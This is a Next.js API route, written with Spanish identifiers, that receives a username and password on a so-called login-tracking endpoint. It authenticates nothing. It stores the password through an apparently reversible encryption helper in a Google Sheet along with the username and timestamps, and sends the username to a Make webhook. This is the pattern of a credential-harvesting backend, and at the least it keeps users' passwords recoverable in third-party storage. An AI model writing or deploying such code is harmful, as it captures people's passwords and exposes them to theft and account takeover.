import { NextRequest, NextResponse } from 'next/server'
import { appendLoginToSheet } from '@/lib/google-sheets'
import { notifyMake } from '@/lib/make'
import { formatLoginDate, encryptPasswordForSheet } from '@/lib/utils'

export async function POST(request: NextRequest) {
  try {
    const { usuario, contraseña } = await request.json()

    if (!usuario || !contraseña) {
      return NextResponse.json(
        { error: 'Usuario y contraseña requeridos' },
        { status: 400 }
      )
    }

    const { fecha, hora } = formatLoginDate()

    // Ejecutar tracking en paralelo sin bloquear
    const results = await Promise.allSettled([
      appendLoginToSheet({
        usuario,
        contraseña: encryptPasswordForSheet(contraseña),
        fecha,
        hora,
      }),
      notifyMake({
        usuario,
        fecha,
        hora,
      }),
    ])

    // Log errores pero no fallar
    results.forEach((result, index) => {
      if (result.status === 'rejected') {
        const service = index === 0 ? 'Google Sheets' : 'Make'
        console.error(`${service} tracking failed (non-critical):`, result.reason)
      }
    })

    return NextResponse.json({
      success: true,
      message: 'Login tracked successfully',
    })
  } catch (error) {
    console.error('Error tracking login:', error)
    return NextResponse.json(
      { error: 'Failed to track login' },
      { status: 500 }
    )
  }
}
